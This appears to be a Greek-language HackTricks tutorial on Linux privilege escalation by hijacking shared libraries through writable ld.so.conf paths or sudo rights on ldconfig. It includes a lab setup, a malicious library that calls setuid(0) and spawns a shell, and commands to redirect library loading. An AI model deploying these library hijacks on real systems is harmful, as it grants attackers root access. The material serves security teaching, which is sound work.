# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Προετοιμάστε το περιβάλλον

Στην παρακάτω ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για να προετοιμάσουμε το περιβάλλον

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιουργήστε** αυτά τα αρχεία στον υπολογιστή σας στον ίδιο φάκελο
2. **Συγκεντρώστε** τη **βιβλιοθήκη**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** `libcustom.so` στο `/usr/lib`: `sudo cp libcustom.so /usr/lib` (δικαιώματα root)
4. **Συγκεντρώστε** το **εκτελέσιμο**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ελέγξτε το περιβάλλον

Ελέγξτε ότι το _libcustom.so_ **φορτώνεται** από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το δυαδικό.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

Σε αυτό το σενάριο θα υποθέσουμε ότι **κάποιος έχει δημιουργήσει μια ευάλωτη είσοδο** μέσα σε ένα αρχείο στο _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι _/home/ubuntu/lib_ (όπου έχουμε δικαίωμα εγγραφής).\
**Κατεβάστε και μεταγλωττίστε** τον παρακάτω κώδικα μέσα σε αυτόν τον φάκελο:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Τώρα που έχουμε **δημιουργήσει τη κακόβουλη βιβλιοθήκη libcustom μέσα στο κακώς ρυθμισμένο** μονοπάτι, πρέπει να περιμένουμε για μια **επανεκκίνηση** ή για τον χρήστη root να εκτελέσει **`ldconfig`** (_σε περίπτωση που μπορείτε να εκτελέσετε αυτό το δυαδικό αρχείο ως **sudo** ή έχει το **suid bit** θα μπορείτε να το εκτελέσετε μόνοι σας_).

Μόλις συμβεί αυτό **ελέγξτε ξανά** από πού φορτώνει το εκτελέσιμο `sharevuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, **το φορτώνει από το `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!NOTE]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κλιμακώσει τα δικαιώματα, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας τον root ή άλλο χρήστη με δικαιώματα να εκτελέσει το ευάλωτο δυαδικό αρχείο** θα μπορέσουμε να κλιμακώσουμε τα δικαιώματα.

### Άλλες κακές ρυθμίσεις - Ίδια ευπάθεια

Στο προηγούμενο παράδειγμα προσποιηθήκαμε μια κακή ρύθμιση όπου ένας διαχειριστής **έθεσε έναν μη προνομιούχο φάκελο μέσα σε ένα αρχείο ρύθμισης μέσα στο `/etc/ld.so.conf.d/`**.\
Αλλά υπάρχουν και άλλες κακές ρυθμίσεις που μπορούν να προκαλέσουν την ίδια ευπάθεια, αν έχετε **δικαιώματα εγγραφής** σε κάποιο **αρχείο ρύθμισης** μέσα στο `/etc/ld.so.conf.d`, στον φάκελο `/etc/ld.so.conf.d` ή στο αρχείο `/etc/ld.so.conf` μπορείτε να ρυθμίσετε την ίδια ευπάθεια και να την εκμεταλλευτείτε.

## Εκμετάλλευση 2

**Υποθέστε ότι έχετε δικαιώματα sudo πάνω στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **από πού να φορτώσει τα αρχεία ρύθμισης**, οπότε μπορούμε να εκμεταλλευτούμε αυτό για να κάνουμε το `ldconfig` να φορτώσει αυθαίρετους φακέλους.\
Έτσι, ας δημιουργήσουμε τα αρχεία και τους φακέλους που χρειάζονται για να φορτώσουμε το "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στην **προηγούμενη εκμετάλλευση**, **δημιουργήστε τη κακόβουλη βιβλιοθήκη μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε τη διαδρομή και να ελέγξουμε από πού φορτώνει η δυαδική βιβλιοθήκη:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας δικαιώματα sudo πάνω στο `ldconfig` μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.**

{{#include ../../banners/hacktricks-training.md}}
